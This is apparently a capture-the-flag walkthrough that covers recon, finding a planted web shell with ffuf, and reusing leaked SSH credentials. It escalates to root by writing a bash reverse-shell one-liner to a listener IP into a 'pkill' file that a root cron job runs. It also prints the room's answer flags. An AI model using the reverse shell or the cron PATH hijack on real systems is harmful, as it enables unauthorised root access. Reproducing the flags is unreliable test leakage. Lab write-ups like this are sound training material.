# Hacker vs. Hacker - Easy

<details>
<summary>Nmap Scan</summary>

```shell
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: RecruitSec: Industry Leading Infosec Recruitment
MAC Address: 02:EC:BE:A6:2B:59 (Unknown)
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

</details>

<br>

```shell
nmap -T4 -p- -A 10.10.118.254

nikto -h http://10.10.118.254

gobuster dir -u http://10.10.118.254 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -o recruitsec.txt
#saves output to file

ffuf -u http://10.10.118.254/cvs/FUZZ.pdf.php -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -s
#to find name of shell file uploaded by hacker

ffuf -u "http://10.10.118.254/cvs/shell.pdf.php?FUZZ=id" -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -mr "id" -s
#to find parameter name used for shell.pdf.php
#-mr matches exact keyword, otherwise we won't be able to find the parameter

ssh lachlan@10.10.118.254
#this gives us access but it is not stable
#keep trying for ssh and create executable pkill in bin directory

echo "bash -c 'bash -i >& /dev/tcp/10.17.48.136/1234 0>&1'" > /home/lachlan/bin/pkill; chmod +x /home/lachlan/bin/pkill

#in attacker machine

nc -nvlp 1234
```

```markdown
After the nmap scan, we can check the webpage on port 80.

The website has a functionality which allows us to upload files, but it has been hacked already.

Meanwhile, we can scan the website directories using Gobuster, which gives us directories - /images,/css,/cvs,/dist.

When visiting the /cvs directory, we get the message 'directory listing disabled'

As the website has already been hacked, we can check for the reverse-shell file that the hacker uploaded.

The way to bypass the filter is by naming file with extension '.pdf.php' so we need to search files with that name.

This gives us the file name 'shell.pdf.php' in /cvs.

After finding the reverse-shell uploaded, we need to think like a hacker.

Next is to find the parameter used for reverse-shell; using ffuf we get the parameter 'cmd'.

Now, we can execute commands on the machine remotely using '/shell.pdf.php?cmd=id'

user.txt can be found in /home/lachlan

'ls -la /home/lachlan' shows us '.bash_history' file; we also have a 'bin' directory

This gives us the creds lachlan:thisistheway123

We can login using ssh, but it is unstable, so we will have to continue through the web shell.

The .bash_history file also refers to a cronjob in '/etc/cron.d/persistence'

From the contents, we can see that the path includes the bin directory found earlier

Also, it shows us that all programs have absolute paths, except 'pkill'

So, we can create a file named pkill in the bin directory. But we need to do it as 'lachlan' and not 'www-data'.

So we need to use ssh to quickly create and give the file executable rights.

After doing so, we get root access on our listener.
```

```shell
#contents of /etc/cron.d/persistence

PATH=/home/lachlan/bin:/bin:/usr/bin
# * * * * * root backup.sh
* * * * * root /bin/sleep 1  && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
* * * * * root /bin/sleep 11 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
* * * * * root /bin/sleep 21 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
* * * * * root /bin/sleep 31 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
* * * * * root /bin/sleep 41 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
* * * * * root /bin/sleep 51 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
```

```markdown
1. What is the user.txt flag? - thm{af7e46b68081d4025c5ce10851430617}

2. What is the root.txt flag? - thm{7b708e5224f666d3562647816ee2a1d4}
```
